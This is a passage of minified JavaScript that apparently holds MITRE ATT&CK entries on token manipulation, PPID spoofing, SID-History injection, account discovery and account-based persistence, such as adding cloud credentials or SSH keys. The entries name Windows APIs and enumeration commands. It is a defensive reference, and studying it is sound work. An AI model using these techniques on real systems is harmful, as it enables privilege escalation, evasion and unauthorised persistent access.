proton"}];hX["subtechnique-of"]=aJ;hZ.id=h_;hZ["object-type"]=a;hZ.name="Create Process with Token";hZ.description="Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with \u003Ccode\u003EDuplicateToken(Ex)\u003C\u002Fcode\u003E and use it with \u003Ccode\u003ECreateProcessWithTokenW\u003C\u002Fcode\u003E to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.";hZ.external_references=[{source_name:b,external_id:h_,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F002"},{url:cb,description:cc,source_name:cd}];hZ["subtechnique-of"]=ah;h$.id=ia;h$["object-type"]=a;h$.name="Make and Impersonate Token";h$.description="Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the \u003Ccode\u003ELogonUser\u003C\u002Fcode\u003E function. The function will return a copy of the new session's access token and the adversary can use \u003Ccode\u003ESetThreadToken\u003C\u002Fcode\u003E to assign the token to a thread.";h$.external_references=[{source_name:b,external_id:ia,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F003"},{url:cb,description:cc,source_name:cd}];h$["subtechnique-of"]=ah;ib.id=ic;ib["object-type"]=a;ib.name="Parent PID Spoofing";ib.description="Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the \u003Ccode\u003ECreateProcess\u003C\u002Fcode\u003E API call, which supports a parameter that defines the PPID to use.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.didierstevens.com\u002F2009\u002F11\u002F22\u002Fquickpost-selectmyparent-or-playing-with-the-windows-process-tree\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via \u003Ccode\u003Esvchost.exe\u003C\u002Fcode\u003E or \u003Ccode\u003Econsent.exe\u003C\u002Fcode\u003E) rather than the current user context.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fsecurity\u002Fidentity-protection\u002Fuser-account-control\u002Fhow-user-account-control-works'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual\u002Fpotentially malicious parent-child process relationships, such as spoofing the PPID of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E\u002F\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F011'\u003ERundll32\u003C\u002Fa\u003E to be \u003Ccode\u003Eexplorer.exe\u003C\u002Fcode\u003E rather than an Office document delivered as part of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F001'\u003ESpearphishing Attachment\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.countercept.com\u002Fblog\u002Fdetecting-parent-pid-spoofing\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This spoofing could be executed via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F005'\u003EVisual Basic\u003C\u002Fa\u003E within a malicious Office document or any code that can perform \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1106'\u003ENative API\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.christophetd.fr\u002Fbuilding-an-office-macro-to-spoof-process-parent-and-command-line\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.countercept.com\u002Fblog\u002Fdetecting-parent-pid-spoofing\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as \u003Ccode\u003Elsass.exe\u003C\u002Fcode\u003E), causing the new process to be elevated via the inherited access token.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.xpnsec.com\u002Fbecoming-system\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";ib.external_references=[{source_name:b,external_id:ic,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F004"},{source_name:"DidierStevens SelectMyParent Nov 2009",url:"https:\u002F\u002Fblog.didierstevens.com\u002F2009\u002F11\u002F22\u002Fquickpost-selectmyparent-or-playing-with-the-windows-process-tree\u002F",description:"Stevens, D. (2009, November 22). Quickpost: SelectMyParent or Playing With the Windows Process Tree. Retrieved June 3, 2019."},{source_name:"Microsoft UAC Nov 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fsecurity\u002Fidentity-protection\u002Fuser-account-control\u002Fhow-user-account-control-works",description:"Montemayor, D. et al.. (2018, November 15). How User Account Control works. Retrieved June 3, 2019."},{source_name:"CounterCept PPID Spoofing Dec 2018",url:"https:\u002F\u002Fwww.countercept.com\u002Fblog\u002Fdetecting-parent-pid-spoofing\u002F",description:"Loh, I. (2018, December 21). Detecting Parent PID Spoofing. Retrieved June 3, 2019."},{source_name:"CTD PPID Spoofing Macro Mar 2019",url:"https:\u002F\u002Fblog.christophetd.fr\u002Fbuilding-an-office-macro-to-spoof-process-parent-and-command-line\u002F",description:"Tafani-Dereeper, C. (2019, March 12). Building an Office macro to spoof parent processes and command line arguments. Retrieved June 3, 2019."},{source_name:"XPNSec PPID Nov 2017",url:"https:\u002F\u002Fblog.xpnsec.com\u002Fbecoming-system\u002F",description:"Chester, A. (2017, November 20). Alternative methods of becoming SYSTEM. Retrieved June 4, 2019."},{source_name:"Microsoft Process Creation Flags May 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fdesktop\u002FProcThread\u002Fprocess-creation-flags",description:"Schofield, M. & Satran, M. (2018, May 30). Process Creation Flags. Retrieved June 4, 2019."},{description:"Secuirtyinbits . (2019, May 14). Parent PID Spoofing (Stage 2) Ataware Ransomware Part 3. Retrieved June 6, 2019.",url:"https:\u002F\u002Fwww.securityinbits.com\u002Fmalware-analysis\u002Fparent-pid-spoofing-stage-2-ataware-ransomware-part-3",source_name:"Secuirtyinbits Ataware3 May 2019"}];ib["subtechnique-of"]=ah;id.id=ie;id["object-type"]=a;id.name="SID-History Injection";id.description="Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa379571.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An account can hold additional SIDs in the SID-History Active Directory attribute \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms679833.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.microsoft.com\u002Fhelp\u002F243330\u002Fwell-known-security-identifiers-in-windows-operating-systems'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E may be inserted into SID-History to enable impersonation of arbitrary users\u002Fgroups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and\u002For access to otherwise inaccessible domains via lateral movement techniques such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021'\u003ERemote Services\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002'\u003ESMB\u002FWindows Admin Shares\u003C\u002Fa\u003E, or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F006'\u003EWindows Remote Management\u003C\u002Fa\u003E.";id.external_references=[{source_name:b,external_id:ie,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F005"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa379571.aspx",description:"Microsoft. (n.d.). Security Identifiers. Retrieved November 30, 2017.",source_name:"Microsoft SID"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms679833.aspx",description:"Microsoft. (n.d.). Active Directory Schema - SID-History attribute. Retrieved November 30, 2017.",source_name:"Microsoft SID-History Attribute"},{url:"https:\u002F\u002Fsupport.microsoft.com\u002Fhelp\u002F243330\u002Fwell-known-security-identifiers-in-windows-operating-systems",description:"Microsoft. (2017, June 23). Well-known security identifiers in Windows operating systems. Retrieved November 30, 2017.",source_name:"Microsoft Well Known SIDs Jun 2017"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fee617241.aspx",description:"Microsoft. (n.d.). Active Directory Cmdlets - Get-ADUser. Retrieved November 30, 2017.",source_name:"Microsoft Get-ADUser"},{url:"https:\u002F\u002Fadsecurity.org\u002F?p=1772",description:"Metcalf, S. (2015, September 19). Sneaky Active Directory Persistence #14: SID History. Retrieved November 30, 2017.",source_name:"AdSecurity SID History Sept 2015"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms677982.aspx",description:"Microsoft. (n.d.). Using DsAddSidHistory. Retrieved November 30, 2017.",source_name:"Microsoft DsAddSidHistory"}];id["subtechnique-of"]=ah;if0.id=ig;if0["object-type"]=a;if0.name="Token Impersonation\u002FTheft";if0.description="Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using \u003Ccode\u003EDuplicateToken(Ex)\u003C\u002Fcode\u003E. The token can then be used with \u003Ccode\u003EImpersonateLoggedOnUser\u003C\u002Fcode\u003E to allow the calling thread to impersonate a logged on user's security context, or with \u003Ccode\u003ESetThreadToken\u003C\u002Fcode\u003E to assign the impersonated token to a thread.\n\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.";if0.external_references=[{source_name:b,external_id:ig,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F001"},{url:cb,description:cc,source_name:cd}];if0["subtechnique-of"]=ah;ik.id=il;ik["object-type"]=a;ik.name=im;ik.description="Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The \u003Ccode\u003EGet-MsolRoleMember\u003C\u002Fcode\u003E PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmsonline\u002Fget-msolrolemember?view=azureadps-1.0'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FTrue-Demon\u002Fraindance'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command \u003Ccode\u003Eaz ad user list\u003C\u002Fcode\u003E will list all users within a domain.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fcli\u002Fazure\u002Fad\u002Fuser?view=azure-cli-latest'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhillsinfosec.com\u002Fred-teaming-microsoft-part-1-active-directory-leaks-via-azure\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nThe AWS command \u003Ccode\u003Eaws iam list-users\u003C\u002Fcode\u003E may be used to obtain a list of users in the current account while \u003Ccode\u003Eaws iam list-roles\u003C\u002Fcode\u003E can obtain IAM roles that have a specified path prefix.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002Fcli\u002Flatest\u002Freference\u002Fiam\u002Flist-roles.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002Fcli\u002Flatest\u002Freference\u002Fiam\u002Flist-users.html'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In GCP, \u003Ccode\u003Egcloud iam service-accounts list\u003C\u002Fcode\u003E and \u003Ccode\u003Egcloud projects get-iam-policy\u003C\u002Fcode\u003E may be used to obtain a listing of service accounts and users in a project.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fsdk\u002Fgcloud\u002Freference\u002Fiam\u002Fservice-accounts\u002Flist'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";ik.external_references=[{source_name:b,external_id:il,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1087\u002F004"},{description:"Microsoft. (n.d.). Get-MsolRoleMember. Retrieved October 6, 2019.",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmsonline\u002Fget-msolrolemember?view=azureadps-1.0",source_name:"Microsoft msolrolemember"},{description:in0,url:io,source_name:ip},{description:dO,url:dP,source_name:dQ},{description:iq,url:ir,source_name:is},{source_name:"AWS List Roles",description:"Amazon. (n.d.). List Roles. Retrieved August 11, 2020.",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002Fcli\u002Flatest\u002Freference\u002Fiam\u002Flist-roles.html"},{source_name:"AWS List Users",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002Fcli\u002Flatest\u002Freference\u002Fiam\u002Flist-users.html",description:"Amazon. (n.d.). List Users. Retrieved August 11, 2020."},{source_name:"Google Cloud - IAM Servie Accounts List API",url:"https:\u002F\u002Fcloud.google.com\u002Fsdk\u002Fgcloud\u002Freference\u002Fiam\u002Fservice-accounts\u002Flist",description:"Google. (2020, June 23). gcloud iam service-accounts list. Retrieved August 4, 2020."}];ik["subtechnique-of"]=aK;it.id=iu;it["object-type"]=a;it.name=iv;it.description="Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\n\nCommands such as \u003Ccode\u003Enet user \u002Fdomain\u003C\u002Fcode\u003E and \u003Ccode\u003Enet group \u002Fdomain\u003C\u002Fcode\u003E of the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E utility, \u003Ccode\u003Edscacheutil -q group\u003C\u002Fcode\u003Eon macOS, and \u003Ccode\u003Eldapsearch\u003C\u002Fcode\u003E on Linux can list domain users and groups.";it.external_references=[{source_name:b,external_id:iu,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1087\u002F002"},{external_id:ii,source_name:c,url:ij}];it["subtechnique-of"]=aK;iw.id=ix;iw["object-type"]=a;iw.name="Email Account";iw.description="Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fexchange\u002Femail-addresses-and-address-books\u002Faddress-lists\u002Faddress-lists?view=exchserver-2019'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn on-premises Exchange and Exchange Online, the\u003Ccode\u003EGet-GlobalAddressList\u003C\u002Fcode\u003E PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fexchange\u002Femail-addresses-and-address-books\u002Fget-globaladdresslist'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhillsinfosec.com\u002Fattacking-exchange-with-mailsniper\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.google.com\u002Fa\u002Fanswer\u002F166870?hl=en'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";iw.external_references=[{source_name:b,external_id:ix,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1087\u002F003"},{source_name:"Microsoft Exchange Address Lists",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fexchange\u002Femail-addresses-and-address-books\u002Faddress-lists\u002Faddress-lists?view=exchserver-2019",description:"Microsoft. (2020, February 7). Address lists in Exchange Server. Retrieved March 26, 2020."},{source_name:"Microsoft getglobaladdresslist",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fexchange\u002Femail-addresses-and-address-books\u002Fget-globaladdresslist",description:"Microsoft. (n.d.). Get-GlobalAddressList. Retrieved October 6, 2019."},{description:"Bullock, B.. (2016, October 3). Attacking Exchange with MailSniper. Retrieved October 6, 2019.",url:"https:\u002F\u002Fwww.blackhillsinfosec.com\u002Fattacking-exchange-with-mailsniper\u002F",source_name:"Black Hills Attacking Exchange MailSniper, 2016"},{source_name:"Google Workspace Global Access List",url:"https:\u002F\u002Fsupport.google.com\u002Fa\u002Fanswer\u002F166870?hl=en",description:iy}];iw["subtechnique-of"]=aK;iz.id=iA;iz["object-type"]=a;iz.name=iB;iz.description="Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as \u003Ccode\u003Enet user\u003C\u002Fcode\u003E and \u003Ccode\u003Enet localgroup\u003C\u002Fcode\u003E of the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E utility and \u003Ccode\u003Eid\u003C\u002Fcode\u003E and \u003Ccode\u003Egroups\u003C\u002Fcode\u003Eon macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the \u003Ccode\u003E\u002Fetc\u002Fpasswd\u003C\u002Fcode\u003E file.";iz.external_references=[{source_name:b,external_id:iA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1087\u002F001"},{source_name:ce,url:cf,description:cg}];iz["subtechnique-of"]=aK;iF.id=iG;iF["object-type"]=a;iF.name="Add Office 365 Global Administrator Role";iF.description="An adversary may add the Global Administrator role to an adversary-controlled account to maintain persistent access to an Office 365 tenant.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.office.com\u002Fen-us\u002Farticle\u002Fadd-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Foffice365\u002Fadmin\u002Fadd-users\u002Fabout-admin-roles?view=o365-worldwide'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins) via the global admin role.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Foffice365\u002Fadmin\u002Fadd-users\u002Fabout-admin-roles?view=o365-worldwide'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nThis account modification may immediately follow \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1136'\u003ECreate Account\u003C\u002Fa\u003E or other malicious account activity.";iF.external_references=[{source_name:b,external_id:iG,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1098\u002F003"},{source_name:iH,url:iI,description:iJ},{source_name:iK,url:iL,description:iM}];iF["subtechnique-of"]=aL;iN.id=iO;iN["object-type"]=a;iN.name="Additional Cloud Credentials";iN.description="Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nAdversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsrc-blog.microsoft.com\u002F2020\u002F12\u002F13\u002Fcustomer-guidance-on-recent-nation-state-cyber-attacks\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fspeakerdeck.com\u002Ftweekfawkes\u002Fblue-cloud-of-death-red-teaming-azure-1'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.youtube.com\u002Fwatch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These credentials include both x509 keys and passwords.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsrc-blog.microsoft.com\u002F2020\u002F12\u002F13\u002Fcustomer-guidance-on-recent-nation-state-cyber-attacks\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnedinthecloud.com\u002F2019\u002F07\u002F16\u002Fdemystifying-azure-ad-service-principals\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078\u002F004'\u003ECloud Accounts\u003C\u002Fa\u003E, adversaries may generate or import their own SSH keys using either the \u003Ccode\u003ECreateKeyPair\u003C\u002Fcode\u003E or \u003Ccode\u003EImportKeyPair\u003C\u002Fcode\u003E API in AWS or the \u003Ccode\u003Egcloud compute os-login ssh-keys add\u003C\u002Fcode\u003E command in GCP.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fsdk\u002Fgcloud\u002Freference\u002Fcompute\u002Fos-login\u002Fssh-keys\u002Fadd'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fexpel.io\u002Fblog\u002Ffinding-evil-in-aws\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fexpel.io\u002Fblog\u002Fbehind-the-scenes-expel-soc-alert-aws\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";iN.external_references=[{source_name:b,external_id:iO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1098\u002F001"},{source_name:dR,url:ch,description:dS},{source_name:"Blue Cloud of Death",url:"https:\u002F\u002Fspeakerdeck.com\u002Ftweekfawkes\u002Fblue-cloud-of-death-red-teaming-azure-1",description:"Kunz, Bryce. (2018, May 11). Blue Cloud of Death: Red Teaming Azure. Retrieved October 23, 2019."},{source_name:"Blue Cloud of Death Video",url:"https:\u002F\u002Fwww.youtube.com\u002Fwatch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815",description:"Kunz, Bruce. (2018, October 14). Blue Cloud of Death: Red Teaming Azure. Retrieved November 21, 2019."},{source_name:"Demystifying Azure AD Service Principals",url:"https:\u002F\u002Fnedinthecloud.com\u002F2019\u002F07\u002F16\u002Fdemystifying-azure-ad-service-principals\u002F",description:"Bellavance, Ned. (2019, July 16). Demystifying Azure AD Service Principals. Retrieved January 19, 2020."},{source_name:"GCP SSH Key Add",url:"https:\u002F\u002Fcloud.google.com\u002Fsdk\u002Fgcloud\u002Freference\u002Fcompute\u002Fos-login\u002Fssh-keys\u002Fadd",description:"Google. (n.d.). gcloud compute os-login ssh-keys add. Retrieved October 1, 2020."},{source_name:ci,url:cj,description:ck},{source_name:"Expel Behind the Scenes",url:"https:\u002F\u002Fexpel.io\u002Fblog\u002Fbehind-the-scenes-expel-soc-alert-aws\u002F",description:"S. Lipton, L. Easterly, A. Randazzo and J. Hencinski. (2020, July 28). Behind the scenes in the Expel SOC: Alert-to-fix in AWS. Retrieved October 1, 2020."}];iN["subtechnique-of"]=aL;iP.id=iQ;iP["object-type"]=a;iP.name="Exchange Email Delegate Permissions";iP.description="Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The \u003Ccode\u003EAdd-MailboxPermission\u003C\u002Fcode\u003E \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fexchange\u002Fmailboxes\u002Fadd-mailboxpermission?view=exchange-ps'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Fcollateral\u002Fen\u002Fmtrends-2018.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.crowdstrike.com\u002Fblog\u002Fhiding-in-plain-sight-using-the-office-365-activities-api-to-investigate-business-email-compromises\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1534'\u003EInternal Spearphishing\u003C\u002Fa\u003E), so the messages evade spam\u002Fphishing detection mechanisms.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.slideshare.net\u002FDouglasBienstock\u002Fshmoocon-2019-becs-and-beyond-investigating-and-defending-office-365'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";iP.external_references=[{source_name:b,external_id:iQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1098\u002F002"},{source_name:"Microsoft - Add-MailboxPermission",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fexchange\u002Fmailboxes\u002Fadd-mailboxpermission?view=exchange-ps",description:"Microsoft. (n.d.). Add-Mailbox Permission. Retrieved September 13, 2019."},{url:"https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Fcollateral\u002Fen\u002Fmtrends-2018.pdf",description:"Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018.",source_name:"FireEye APT35 2018"},{source_name:"Crowdstrike Hiding in Plain Sight 2018",url:"https:\u002F\u002Fwww.crowdstrike.com\u002Fblog\u002Fhiding-in-plain-sight-using-the-office-365-activities-api-to-investigate-business-email-compromises\u002F",description:"Crowdstrike. (2018, July 18). Hiding in Plain Sight: Using the Office 365 Activities API to Investigate Business Email Compromises. Retrieved January 19, 2020."},{source_name:"Bienstock, D. - Defending O365 - 2019",url:"https:\u002F\u002Fwww.slideshare.net\u002FDouglasBienstock\u002Fshmoocon-2019-becs-and-beyond-investigating-and-defending-office-365",description:"Bienstock, D.. (2019). BECS and Beyond: Investigating and Defending O365. Retrieved September 13, 2019."}];iP["subtechnique-of"]=aL;iR.id=iS;iR["object-type"]=a;iR.name=iT;iR.description="Adversaries may modify the SSH \u003Ccode\u003Eauthorized_keys\u003C\u002Fcode\u003E file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The \u003Ccode\u003Eauthorized_keys\u003C\u002Fcode\u003E file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under \u003Ccode\u003E&lt;user-home&gt;\u002F.ssh\u002Fauthorized_keys\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ssh.com\u002Fssh\u002Fauthorized_keys\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under \u003Ccode\u003E\u002Fetc\u002Fssh\u002Fsshd_config\u003C\u002Fcode\u003E.\n\nAdversaries may modify SSH \u003Ccode\u003Eauthorized_keys\u003C\u002Fcode\u003E files directly with scripts or shell commands to add their own adversary-supplied public keys. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.\u003Csup\u003E\u003Ca 